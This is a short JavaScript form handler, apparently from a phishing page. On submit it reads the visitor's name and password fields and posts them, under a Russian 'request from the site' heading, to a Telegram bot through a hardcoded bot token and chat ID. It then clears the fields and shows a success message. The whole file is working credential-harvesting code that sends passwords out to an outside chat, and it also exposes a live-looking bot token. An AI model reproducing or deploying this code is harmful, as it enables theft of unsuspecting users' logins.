
const TOKEN = "5861426993:AAG2e0J1ZxG43QYZdKFYYghH8zF6QiqUIHg";
const CHAT_ID = "-1001826418549";
const URI_IP = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const success = document.getElementById('success')
document.getElementById('tg').addEventListener('submit',function (e) {
    e.preventDefault();
    let message = `<b>Заявка с сайта!</b>`;
    message += `<b>Отправитель:</b>${ this.name.value}\n`;
    message += `<b>Пароль:</b>${ this.password.value}`;
    axios.post(URI_IP, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message})
        .then((res) => {
            this.name.value = '';
            this.password.value = '';
            success.innerHTML = 'Сообщение отправлено '
            success.classList.display = 'block'
        })
        .catch((err) =>{
            console.warn(err)
        })
        .finally(() =>{
            console.log('Конец')
        })

})